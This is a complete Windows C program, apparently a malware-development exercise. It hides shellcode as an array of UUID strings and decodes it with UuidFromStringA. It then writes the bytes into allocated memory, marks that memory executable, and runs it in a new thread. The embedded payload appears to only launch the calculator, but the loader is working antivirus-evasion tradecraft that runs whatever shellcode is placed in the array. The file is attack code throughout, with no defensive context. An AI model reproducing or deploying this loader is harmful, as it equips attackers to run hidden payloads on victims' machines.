#include <Windows.h>
#include <stdio.h>


char* UuidArray[] = {
    "E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C6300"
};


#define NumberOfElements 17


typedef RPC_STATUS (WINAPI * fnUuidFromStringA)(
    RPC_CSTR StringUuid,
    UUID* Uuid
);


BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE pBuffer = NULL, TmpBuffer = NULL;

    SIZE_T sBuffSize = NULL;

    PCSTR Terminator = NULL;

    NTSTATUS STATUS = NULL;


    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("Rpcrt4.dll")), "UuidFromStringA");

    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed with Error: %d \n", GetLastError());
        return FALSE;
    }

    sBuffSize = NmbrOfElements * 16;

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);

    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed with Error: %d \n", GetLastError());
        return FALSE;   
    }

    TmpBuffer = pBuffer;

    for (int i = 0; i < NmbrOfElements; i++) {

        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK){
            printf("[!] UuidFromStringA Failed with Error: %d \n", STATUS);
            HeapFree(GetProcessHeap(), 0, pBuffer);
            return FALSE;
        }

        TmpBuffer = (PBYTE)(TmpBuffer + 16);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;

}


int main() {
    PBYTE pDeobfuscatedPayload = NULL;
    SIZE_T sDeobfuscatedSize = NULL;

    printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());

    printf("[#] Press <Enter> To Decrypt ... \n");
    getchar();

    printf("[i] Decrypting ... \n");
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }

    printf("[+] DONE !\n");

    printf("[i] Deobfuscated Payload At : 0x%p Of Size: %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[i] Press <Enter> To Allocate ... \n");

    getchar();

    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed with Error: %d \n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
        return -1;
    }

    printf("[i] Allocated Memory At: 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... \n");

    getchar();

    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);

    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... \n");

    getchar();

    if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed with Error: %d \n", GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] Press <Enter> To Exit ... \n");
    getchar();

    return 0;        
}